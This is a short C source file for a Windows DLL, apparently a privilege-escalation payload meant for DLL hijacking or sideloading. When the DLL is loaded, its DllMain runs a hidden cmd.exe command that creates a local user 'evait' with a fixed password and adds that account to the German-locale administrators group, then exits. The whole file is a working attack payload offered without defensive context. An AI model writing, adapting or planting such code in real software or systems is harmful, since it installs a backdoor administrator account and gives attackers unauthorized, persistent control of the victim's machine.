#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user evait oJXAJrTa.Oh /Y /add; net localgroup administratoren evait /Y /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}